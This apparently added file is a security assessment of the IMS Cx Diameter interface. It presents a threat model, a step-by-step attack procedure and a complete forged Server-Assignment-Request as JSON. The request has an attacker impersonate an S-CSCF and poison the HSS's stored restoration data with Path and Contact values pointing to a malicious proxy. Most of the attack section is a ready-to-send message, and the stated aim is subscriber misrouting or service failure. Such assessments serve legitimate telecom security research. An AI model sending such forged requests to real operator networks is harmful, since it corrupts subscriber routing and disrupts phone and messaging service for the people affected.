@@ -1,0 +1,176 @@
+**Threat Model:**
+
+- **Attack Assumption:**
+  - The victim is an **HSS** exposing the **Cx** interface to the Internet.
+  - The attacker can impersonate an **S-CSCF** and send a forged **Server-Assignment-Request (SAR)** to that HSS.
+  - No IPsec/TLS or peer authentication is enforced.
+  - The attacker knows the target subscriber's **Private User Identity** and can craft a protocol-plausible SAR for that user.
+
+- **Attacker Capability:**
+  - The attacker can open its own Diameter connection to the HSS, send SAR requests, and receive SAA responses.
+  - The attacker cannot observe or alter traffic between the real S-CSCF and HSS.
+  - The attacker is not itself a functioning IMS serving node, but under the threat model it can still submit syntactically and semantically plausible S-CSCF-originated SARs.
+
+**Exploitability Analysis:**
+
+`SCSCF-Restoration-Info.Restoration-Info` is a grouped AVP inside **SAR (command code 301, application-id 16777216)** on the **Cx** interface, processed by the **HSS**. It is not transport metadata. It is the per-registration restoration container holding mandatory `Path` and `Contact` and optional SIP-state elements for a specific IMS registration.
+
+This field is processed by the HSS as **authoritative restoration-state input from the serving S-CSCF**. Per TS 29.229, `SCSCF-Restoration-Info` contains information required for an S-CSCF to handle requests for a user, and `Restoration-Info` contains information related to a **specific registration**. Per TS 23.380, the S-CSCF backs up this registration state in the HSS, and the HSS **shall store** it. Per TS 29.228, the HSS can later return stored `SCSCF-Restoration-Info` in **SAA** for restoration-related handling.
+
+That creates a distinct field-specific effect: modifying `Restoration-Info` changes the **stored restorable registration dataset** for the subscriber, not merely the generic fact that a SAR was sent. The attacker can supply malicious `Path` and `Contact` values within a forged `Restoration-Info` entry, causing the HSS to retain incorrect per-registration SIP routing/contact state for that private identity. On later restoration-triggering procedures, the HSS may return that corrupted state to an S-CSCF, which then uses it as restoration input for handling requests for the user.
+
+The security impact is therefore concrete and attributable to this field itself:
+- corruption of **stored IMS restoration state**;
+- later restoration using wrong `Path` / `Contact` data;
+- consequent **service mis-handling, failed request handling, or misrouting within IMS restoration flows**.
+
+This is more than generic forged-SAR harm. The enclosing SAR in general updates serving-server state, but the target field specifically controls the backed-up **per-registration restorable SIP state**. Its semantics are operational and stateful, not descriptive only.
+
+The state impact is also meaningful:
+- scope: **per Private User Identity**, within the relevant implicit registration set;
+- content: one or more specific registration restoration entries;
+- persistence: retained by the HSS until later overwritten.
+
+Recovery is not immediate. TS 23.380 indicates that when updated restoration information is later received for the same private identity, the HSS overwrites the previous information. So correction typically depends on a subsequent legitimate registration or re-registration update from the real S-CSCF. Until then, the malicious restoration record can persist and be reused.
+
+Under this threat model, that is enough for **EXPLOITABLE**: the field is accepted, stored, later reused, and can alter later network behavior in a way specifically caused by the forged `Restoration-Info` content.
+
+**Attack Procedure:**
+
+1. Establish a Diameter connection to the Internet-exposed **HSS** while impersonating an **S-CSCF**.
+2. Send a **Server-Assignment-Request (SAR)** with:
+   - `command_code = 301`
+   - `application_id = 16777216`
+   - `Server-Assignment-Type = RE_REGISTRATION`  
+     so the restoration-information update is procedurally coherent.
+3. Include the minimum mandatory SAR AVPs plus `User-Name`, `Server-Name`, and a grouped `SCSCF-Restoration-Info`.
+4. Inside `SCSCF-Restoration-Info`, include:
+   - matching `User-Name`
+   - one malicious `Restoration-Info` entry
+5. In that `Restoration-Info`, set:
+   - `Path` to an attacker-chosen or invalid SIP path
+   - `Contact` to an attacker-chosen or invalid contact URI  
+   These are the malicious test values because they directly define the stored per-registration restoration state.
+6. Expected success condition:
+   - the HSS accepts the SAR and stores the supplied restoration dataset;
+   - later restoration-related SAA handling for that subscriber returns the poisoned restoration information, causing restoration mis-handling or service failure traceable to the forged `Restoration-Info`.
+
+Only mandatory and coherence-related fields are included below; unrelated optional AVPs are excluded.
+
+**Attack Message:**
+```json
+{
+  "diameter_header": {
+    "command_code": 301,
+    "application_id": 16777216,
+    "request": true,
+    "proxiable": true
+  },
+  "avps": [
+    {
+      "avp_name": "Session-Id",
+      "avp_value": "attacker.scscf.example.com;1710000001;cx-sar-restoration"
+    },
+    {
+      "avp_name": "Vendor-Specific-Application-Id",
+      "grouped_avp": [
+        {
+          "avp_name": "Vendor-Id",
+          "avp_value": 10415
+        },
+        {
+          "avp_name": "Auth-Application-Id",
+          "avp_value": 16777216
+        }
+      ]
+    },
+    {
+      "avp_name": "Auth-Session-State",
+      "avp_value": 1
+    },
+    {
+      "avp_name": "Origin-Host",
+      "avp_value": "attacker.scscf.example.com"
+    },
+    {
+      "avp_name": "Origin-Realm",
+      "avp_value": "example.com"
+    },
+    {
+      "avp_name": "Destination-Realm",
+      "avp_value": "ims.mnc001.mcc001.3gppnetwork.org"
+    },
+    {
+      "avp_name": "Destination-Host",
+      "avp_value": "hss1.ims.mnc001.mcc001.3gppnetwork.org"
+    },
+    {
+      "avp_name": "User-Name",
+      "avp_value": "sip:user001@ims.mnc001.mcc001.3gppnetwork.org"
+    },
+    {
+      "avp_name": "Public-Identity",
+      "avp_value": "sip:user001@ims.mnc001.mcc001.3gppnetwork.org"
+    },
+    {
+      "avp_name": "Server-Name",
+      "avp_value": "sip:scscf1.ims.mnc001.mcc001.3gppnetwork.org"
+    },
+    {
+      "avp_name": "Server-Assignment-Type",
+      "avp_value": "RE_REGISTRATION"
+    },
+    {
+      "avp_name": "User-Data-Already-Available",
+      "avp_value": 0
+    },
+    {
+      "avp_name": "SCSCF-Restoration-Info",
+      "grouped_avp": [
+        {
+          "avp_name": "User-Name",
+          "avp_value": "sip:user001@ims.mnc001.mcc001.3gppnetwork.org"
+        },
+        {
+          "avp_name": "Restoration-Info",
+          "grouped_avp": [
+            {
+              "avp_name": "Path",
+              "avp_value": "<sip:malicious-proxy.attacker.example;lr>"
+            },
+            {
+              "avp_name": "Contact",
+              "avp_value": "<sip:nonexistent-user@203.0.113.66;transport=udp>"
+            },
+            {
+              "avp_name": "Initial-CSeq-Sequence-Number",
+              "avp_value": 4294960000
+            },
+            {
+              "avp_name": "Call-ID-SIP-Header",
+              "avp_value": "forged-restoration-callid-001@attacker.example"
+            }
+          ]
+        },
+        {
+          "avp_name": "Registration-Time-Out",
+          "avp_value": 3600
+        },
+        {
+          "avp_name": "SIP-Authentication-Scheme",
+          "avp_value": "Digest-AKAv1-MD5"
+        }
+      ]
+    }
+  ]
+}
+```
+
+**Classification:**
+
+- `EXPLOITABLE`
+
+Sources:  
+- ETSI TS 29.229: https://www.etsi.org/deliver/etsi_ts/129200_129299/129229/17.03.00_60/ts_129229v170300p.pdf  
+- 3GPP TS 29.228: https://www.freecalypso.org/pub/GSM/3GPP/archive/29_series/29.228/29228-b90.pdf  
+- ETSI TS 23.380: https://www.etsi.org/deliver/etsi_ts/123300_123399/123380/11.05.01_60/ts_123380v110501p.pdf
